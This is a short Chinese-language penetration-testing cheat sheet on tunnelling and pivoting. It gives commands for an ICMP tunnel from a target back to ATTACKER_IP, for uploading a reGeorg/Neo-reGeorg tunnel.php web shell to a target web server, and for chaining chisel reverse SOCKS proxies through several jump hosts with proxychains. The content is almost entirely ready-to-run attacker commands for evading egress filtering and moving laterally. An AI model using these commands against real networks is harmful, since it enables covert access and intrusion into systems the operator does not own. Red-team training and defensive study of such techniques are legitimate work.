# 流量代理与隧道

### 14.1 IcmpTunnel

```bash
# ICMP 隧道（绕过仅允许 ICMP 出网的环境）
# 服务端
./icmptunnel -s 10.0.0.1
# 客户端（目标机器）
./icmptunnel -c ATTACKER_IP

# 配置隧道接口
ip addr add 10.0.1.1/24 dev tun0  # 服务端
ip addr add 10.0.1.2/24 dev tun0  # 客户端
```

### 14.2 HTTP 隧道

```bash
# 使用 re Georg 通过 HTTP 代理
# 1. 上传 tunnel.php 到目标 Web 服务器
# 2. 通过 HTTP 建立隧道
python reGeorg.py -u http://target.com/tunnel.php -p 1080

# 使用 Neo-reGeorg（改进版）
python neoreGeorg.py -u http://target.com/tunnel.php -p 1080
```

### 14.3 多级代理链

```bash
# 多级 SOCKS 代理链
# 场景: 攻击机 -> 跳板A -> 跳板B -> 跳板C -> 目标

# 跳板A: chisel 服务端
chisel server -p 8080 --reverse

# 跳板B: chisel 客户端连接A，同时开服务端
chisel client ATTACKER_IP:8080 R:1081:socks
chisel server -p 8081 --reverse

# 跳板C: chisel 客户端连接B
chisel client JUMP_B_IP:8081 R:1082:socks

# proxychains 配置多级代理
# /etc/proxychains4.conf
socks5 127.0.0.1 1080  # 第一级
socks5 127.0.0.1 1081  # 第二级
socks5 127.0.0.1 1082  # 第三级
```
